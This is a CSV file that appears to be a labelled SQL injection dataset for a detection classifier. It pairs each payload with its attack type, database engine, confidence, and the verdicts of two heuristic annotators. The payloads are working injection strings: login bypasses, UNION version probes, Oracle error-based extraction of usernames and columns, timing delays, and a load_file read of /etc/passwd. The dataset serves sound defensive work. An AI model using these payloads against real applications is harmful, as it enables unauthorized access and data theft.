payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"select * from users where id = 1 or 1#"". union select 'a',version ( ) -- 1",union_based,mysql,0.9,# + UNION SELECT with version(),KEEP,,union_based,mysql,79,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or 1#"". union select 'a',version ( ) -- 1"
"select * from users where id = 1 or 1#""; union select null,version ( ) -- 1",union_based,mysql,0.9,"#; + UNION SELECT null,version()",KEEP,,union_based,mysql,80,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or 1#""; union select null,version ( ) -- 1"
"select * from users where id = 1 or 1#""? or 1 = 1 -- 1",boolean_blind,mysql,0.85,#? obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,81,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or 1#""? or 1 = 1 -- 1"
"""a"""" or 1 = 1--""",auth_bypass,generic,0.9,"\\""a\""\""\"" or 1=1--\""\"" is auth bypass""",KEEP,,auth_bypass,generic,82,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","""a"""" or 1 = 1--"""
"select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1",union_based,oracle,0.95,*1 + v$version for Oracle union SQLi,KEEP,,union_based,oracle,83,union_based,oracle,Pattern match: 'union select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1"
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 4 ) ) AND 'i' = 'i",error_based,oracle,0.95,utl_inaddr + all_tab_columns for Oracle error SQLi,KEEP,,error_based,oracle,84,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 4 ) ) AND 'i' = 'i"
"select * from users where id = '1' union select ( \ ) ,@@VERSION -- 1'",union_based,mssql,0.85,\ ) + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,85,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' union select ( \ ) ,@@VERSION -- 1'"
1 and user_name ( ) = 'dbo',auth_bypass,mssql,0.85,user_name() = 'dbo' for MSSQL auth bypass,KEEP,,auth_bypass,mssql,86,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,1 and user_name ( ) = 'dbo'
"; if not ( substring ( ( select @@version ) ,24,1 ) <> 1 ) waitfor delay '0:0:2' --",time_blind,mssql,0.95,waitfor delay + substring for MSSQL time blind,KEEP,,time_blind,mssql,87,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,"; if not ( substring ( ( select @@version ) ,24,1 ) <> 1 ) waitfor delay '0:0:2' --"
"select * from users where id = 1 or 1#""$ union select 1,version ( ) -- 1",union_based,mysql,0.9,#$ + UNION SELECT for union SQLi,KEEP,,union_based,mysql,88,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or 1#""$ union select 1,version ( ) -- 1"
"select * from users where id = 1 or 1#""{ union select null,version ( ) -- 1",union_based,mysql,0.85,"#{ + UNION SELECT null,version()",KEEP,,union_based,mysql,89,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or 1#""{ union select null,version ( ) -- 1"
select * from users where id = '1' *$ . or 1 = 1 -- 1',boolean_blind,mysql,0.8,*$ . obfuscation for boolean blind SQLi,KEEP,,boolean_blind,mysql,90,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = '1' *$ . or 1 = 1 -- 1'
select * from users where id = 1 +$+. or 1 = 1 -- 1,boolean_blind,mysql,0.85,+$+. obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,91,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 +$+. or 1 = 1 -- 1
select * from users where id = 1 or ( \+ ) = 1 or 1 = 1 -- 1,boolean_blind,mysql,0.8,\+ ) for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,92,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 or ( \+ ) = 1 or 1 = 1 -- 1
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 6 ) ) AND 'i' = 'i",error_based,oracle,0.95,utl_inaddr + SYS.ALL_USERS error SQLi,KEEP,,error_based,oracle,93,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 6 ) ) AND 'i' = 'i"
or 1 = 1 or '' = ',boolean_blind,generic,0.9,or 1=1 or '' = ' for boolean blind SQLi,KEEP,,boolean_blind,generic,94,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",or 1 = 1 or '' = '
select * from users where id = 1 or 1 = 1 -- 1,boolean_blind,generic,0.95,or 1=1 for generic boolean blind SQLi,KEEP,,boolean_blind,generic,95,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 or 1 = 1 -- 1
or 'text' > 't',boolean_blind,generic,0.8,'text' > 't' for boolean blind SQLi,KEEP,,boolean_blind,generic,96,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,or 'text' > 't'
"select * from users where id = 1 or ""%["" or 1 = 1 -- 1",boolean_blind,mysql,0.85,%[ obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,97,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""%["" or 1 = 1 -- 1"
"select * from users where id = 1 or 1#""; = 1 union select 1,version ( ) -- 1",union_based,mysql,0.9,#; = + UNION SELECT for union SQLi,KEEP,,union_based,mysql,98,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or 1#""; = 1 union select 1,version ( ) -- 1"
admin' or '1' = '1'#,auth_bypass,generic,0.95,admin' or '1'='1'# for auth bypass,KEEP,,auth_bypass,generic,99,auth_bypass,generic,Pattern match: 'admin' or '1' = '1' → auth_bypass (P2); DB signature: generic,auth_bypass,generic,admin' prefix near boolean/comment context,admin' or '1' = '1'#
select * from users where id = 1 +$ 1 or 1 = 1 -- 1,boolean_blind,mysql,0.8,+$ 1 obfuscation for boolean blind SQLi,KEEP,,boolean_blind,mysql,100,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 +$ 1 or 1 = 1 -- 1
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 4 ) ) AND 'i' = 'i",error_based,oracle,0.95,utl_inaddr + SYS.ALL_USERS error SQLi,KEEP,,error_based,oracle,101,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 4 ) ) AND 'i' = 'i"
select * from information_schema.tables--,benign,mysql,0.7,information_schema.tables requires context,KEEP,,benign,mysql,102,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal,select * from information_schema.tables--
"select * from users where id = 1 or ""$&"" or 1 = 1 -- 1",boolean_blind,mysql,0.85,$& obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,103,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""$&"" or 1 = 1 -- 1"
1 ) ) or pg_sleep ( __TIME__ ) --,time_blind,postgresql,0.95,pg_sleep for PostgreSQL time blind SQLi,KEEP,,time_blind,postgresql,104,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,benign,generic,no SQLi signal in heuristic check,1 ) ) or pg_sleep ( __TIME__ ) --
"select * from users where id = '1' union select !<@,version ( ) -- 1'",union_based,mysql,0.85,!<@ obfuscation + version() union SQLi,KEEP,,union_based,mysql,105,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' union select !<@,version ( ) -- 1'"
select * from users where id = 1 %!<1 or 1 = 1 -- 1,boolean_blind,mysql,0.8,%!<1 obfuscation for boolean blind SQLi,KEEP,,boolean_blind,mysql,106,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 %!<1 or 1 = 1 -- 1
"select * from users where id = 1 or ""]1"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,]1 obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,107,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""]1"" or 1 = 1 -- 1"
"select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1",union_based,mssql,0.85,$+<1 + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,108,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1"
or 'unusual' = 'unusual',benign,generic,0.7,or 'unusual'='unusual' is tautology not attack,KEEP,,benign,generic,109,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,or 'unusual' = 'unusual'
or 1 in ( select @@version ) --,boolean_blind,generic,0.8,or 1 in (select) is generic boolean blind,KEEP,,boolean_blind,generic,110,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,or 1 in ( select @@version ) --
 or 3 = 3 --,boolean_blind,generic,0.8,Unusual character prefix for boolean blind SQLi,KEEP,,boolean_blind,generic,111,boolean_blind,generic,Pattern match: 'or 3 = 3' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)", or 3 = 3 --
"select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1",union_based,oracle,0.95,||1 + v$version for Oracle union SQLi,KEEP,,union_based,oracle,112,union_based,oracle,Pattern match: 'union select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1"
"select * from users where id = 1 <@$$ union select 1,version ( ) -- 1",union_based,mysql,0.85,<@$$ union select for union SQLi,KEEP,,union_based,mysql,113,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 <@$$ union select 1,version ( ) -- 1"
"admin"" ) or ( ""1"" = ""1",auth_bypass,generic,0.9,"admin\) or (\""1\""=\""1 for auth bypass""",KEEP,,auth_bypass,generic,114,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"admin"" ) or ( ""1"" = ""1"
"select * from users where id = 1 or 1#""@ union select 'a',version ( ) -- 1",union_based,mysql,0.9,"#@ + UNION SELECT 'a',version()",KEEP,,union_based,mysql,115,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or 1#""@ union select 'a',version ( ) -- 1"
"1 ) or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,0.9,benchmark + MD5 for time-based blind SQLi,KEEP,,time_blind,mysql,116,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) or benchmark ( 10000000,MD5 ( 1 ) ) #"
"select * from users where id = 1 union select .1_,version ( ) -- 1",union_based,mysql,0.8,.1_ union select for union SQLi,KEEP,,union_based,mysql,117,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 union select .1_,version ( ) -- 1"
AND 1 = utl_inaddr.get_host_address ( ( SELECT SYS.DATABASE_NAME FROM DUAL ) ) AND 'i' = 'i,error_based,oracle,0.95,utl_inaddr + SYS.DATABASE_NAME for Oracle error,KEEP,,error_based,oracle,118,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,AND 1 = utl_inaddr.get_host_address ( ( SELECT SYS.DATABASE_NAME FROM DUAL ) ) AND 'i' = 'i
select * from users where id = 1 %$ 1 or 1 = 1 -- 1,boolean_blind,mysql,0.8,%$ 1 obfuscation for boolean blind SQLi,KEEP,,boolean_blind,mysql,119,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 %$ 1 or 1 = 1 -- 1
select * from users where id = 1 %!<@ or 1 = 1 -- 1,boolean_blind,mysql,0.8,%!<@ obfuscation for boolean blind SQLi,KEEP,,boolean_blind,mysql,120,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 %!<@ or 1 = 1 -- 1
"; if not ( substring ( ( select @@version ) ,25,1 ) <> 0 ) waitfor delay '0:0:2' --",time_blind,mssql,0.95,waitfor delay + substring for MSSQL time blind,KEEP,,time_blind,mssql,121,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,"; if not ( substring ( ( select @@version ) ,25,1 ) <> 0 ) waitfor delay '0:0:2' --"
1 ) or sleep ( __TIME__ ) #,time_blind,mysql,0.9,sleep() for MySQL time-based blind SQLi,KEEP,,time_blind,mysql,122,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1 ) or sleep ( __TIME__ ) #
"select * from users where id = 1 or ""1_"" or 1 = 1 -- 1",boolean_blind,mysql,0.85,1_ obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,123,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""1_"" or 1 = 1 -- 1"
"select * from users where id = 1 <1## union select 1,version ( ) -- 1",union_based,mysql,0.85,<1## + UNION SELECT for union SQLi,KEEP,,union_based,mysql,124,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 <1## union select 1,version ( ) -- 1"
"select * from users where id = 1 + $+*\ union select null,@@VERSION -- 1",union_based,mssql,0.85,$+*\ + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,125,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 + $+*\ union select null,@@VERSION -- 1"
select * from users where id = 1. <@ or 1 = 1 -- 1,boolean_blind,mysql,0.8,<@ obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,126,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1. <@ or 1 = 1 -- 1
or true--,boolean_blind,generic,0.95,or true-- is generic boolean blind SQLi,KEEP,,boolean_blind,generic,127,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,or true--
; execute immediate 'sel' || 'ect us' || 'er',stacked_queries,oracle,0.9,execute immediate for Oracle stacked queries,KEEP,,stacked_queries,oracle,128,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,; execute immediate 'sel' || 'ect us' || 'er'
hi' or 'x' = 'x';,auth_bypass,generic,0.95,hi' or 'x'='x'; is auth bypass,KEEP,,auth_bypass,generic,129,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,hi' or 'x' = 'x';
select * from users where id = 1 <@ or 1 = 1 -- 1,boolean_blind,mysql,0.8,<@ obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,130,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 <@ or 1 = 1 -- 1
"select * from users where id = 1 or "".,"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,".,\ obfuscation for boolean blind SQLi""",KEEP,,boolean_blind,mysql,131,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "".,"" or 1 = 1 -- 1"
admin' #,auth_bypass,generic,0.95,admin' # is classic auth bypass,KEEP,,auth_bypass,generic,132,auth_bypass,generic,Pattern match: 'admin' #' → auth_bypass (P2); DB signature: generic,auth_bypass,generic,admin' prefix near boolean/comment context,admin' #
"select * from users where id = 1 <@$_ union select 1,version ( ) -- 1",union_based,mysql,0.85,<@$_ union select for union SQLi,KEEP,,union_based,mysql,133,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 <@$_ union select 1,version ( ) -- 1"
"union select 1,load_file ( '/etc/passwd' ) ,1,1,1;",out_of_band,mysql,0.9,load_file('/etc/passwd') for OOB file read,KEEP,,out_of_band,mysql,134,out_of_band,generic,Pattern match: 'load_file (' → out_of_band (P6); DB signature: generic,union_based,generic,UNION SELECT structure,"union select 1,load_file ( '/etc/passwd' ) ,1,1,1;"
""" ) ;waitfor delay '0:0:__TIME__'--",time_blind,mssql,0.9,waitfor delay for MSSQL time blind SQLi,KEEP,,time_blind,mssql,135,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,""" ) ;waitfor delay '0:0:__TIME__'--"
"admin"" or ""1"" = ""1""/*",auth_bypass,mysql,0.9,"admin\\"" or \""1\""=\""1\""/* is auth bypass""",KEEP,,auth_bypass,mysql,136,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"admin"" or ""1"" = ""1""/*"
"select * from users where id = 1 or ""1 ( "" = 1 or 1 = 1 -- 1",boolean_blind,mysql,0.8,"\""1 (\"" for boolean blind SQLi""",KEEP,,boolean_blind,mysql,137,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""1 ( "" = 1 or 1 = 1 -- 1"
"select * from users where id = 1 or \<1 union select 1,@@VERSION -- 1",union_based,mssql,0.85,\<1 + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,138,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or \<1 union select 1,@@VERSION -- 1"
or username like char ( 37 ) ;,boolean_blind,generic,0.8,username LIKE char(37) for boolean blind SQLi,KEEP,,boolean_blind,generic,139,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,or username like char ( 37 ) ;
) ) or pg_sleep ( __TIME__ ) --,time_blind,postgresql,0.95,pg_sleep for PostgreSQL time blind SQLi,KEEP,,time_blind,postgresql,140,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,benign,generic,no SQLi signal in heuristic check,) ) or pg_sleep ( __TIME__ ) --
select * from users where id = 1 or $+<\ or 1 = 1 -- 1,boolean_blind,mysql,0.8,$+<\ for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,141,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 or $+<\ or 1 = 1 -- 1
or 3 = 3,boolean_blind,generic,0.9,or 3=3 is generic boolean blind SQLi,KEEP,,boolean_blind,generic,142,boolean_blind,generic,Pattern match: 'or 3 = 3' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",or 3 = 3
"select * from users where id = 1 or "" ( ."" or 1 = 1 -- 1",boolean_blind,mysql,0.8,"( .\ obfuscation for boolean blind SQLi""",KEEP,,boolean_blind,mysql,143,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "" ( ."" or 1 = 1 -- 1"
select * from users where id = 1 or ( $+ ) = 1 or 1 = 1 -- 1,boolean_blind,mysql,0.8,$+ ) for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,144,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 or ( $+ ) = 1 or 1 = 1 -- 1
"select * from users where id = 1 or \+<$ union select 1,@@VERSION -- 1",union_based,mssql,0.85,\+<$ + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,145,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or \+<$ union select 1,@@VERSION -- 1"
select * from users where id = 1 or \<$ or 1 = 1 -- 1,boolean_blind,mysql,0.8,\<$ for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,146,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 or \<$ or 1 = 1 -- 1
"select * from users where id = 1.&&1 union select 1,version ( ) -- 1",union_based,mysql,0.85,&&1 + version() for union SQLi,KEEP,,union_based,mysql,147,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1.&&1 union select 1,version ( ) -- 1"
admin' or 1 = 1/*,auth_bypass,generic,0.95,admin' or 1=1/* is auth bypass,KEEP,,auth_bypass,generic,148,auth_bypass,generic,Pattern match: 'admin' or 1 = 1' → auth_bypass (P2); DB signature: generic,auth_bypass,generic,admin' prefix near boolean/comment context,admin' or 1 = 1/*
a' waitfor delay '0:0:10'--,time_blind,mssql,0.95,waitfor delay '0:0:10' for MSSQL time blind,KEEP,,time_blind,mssql,149,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,a' waitfor delay '0:0:10'--
"select * from users where id = 1 + ( \ ) union select null,@@VERSION -- 1",union_based,mssql,0.85,\ ) + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,150,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 + ( \ ) union select null,@@VERSION -- 1"
"select * from users where id = 1 union select .1$_,version ( ) -- 1",union_based,mysql,0.8,.1$_ union select for union SQLi,KEEP,,union_based,mysql,151,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 union select .1$_,version ( ) -- 1"
and 1 in ( select var from temp ) --,boolean_blind,generic,0.8,and 1 in (select) for boolean blind SQLi,KEEP,,boolean_blind,generic,152,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,and 1 in ( select var from temp ) --
hi' ) or ( 'a' = 'a,auth_bypass,generic,0.95,hi') or ('a'='a for auth bypass,KEEP,,auth_bypass,generic,153,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,hi' ) or ( 'a' = 'a
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 1 ) ) AND 'i' = 'i",error_based,oracle,0.95,utl_inaddr + all_tab_columns for Oracle error,KEEP,,error_based,oracle,154,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 1 ) ) AND 'i' = 'i"
"admin"" or 1 = 1",auth_bypass,mysql,0.95,"admin\\"" or 1=1 for MySQL auth bypass""",KEEP,,auth_bypass,mysql,155,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","admin"" or 1 = 1"
""" ) or true--",boolean_blind,generic,0.9,"\) or true-- is boolean blind SQLi""",KEEP,,boolean_blind,generic,156,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,""" ) or true--"
"select * from users where id = '1' or $ . = 1 union select 1,@@VERSION -- 1'",union_based,mssql,0.85,$ . + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,157,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' or $ . = 1 union select 1,@@VERSION -- 1'"
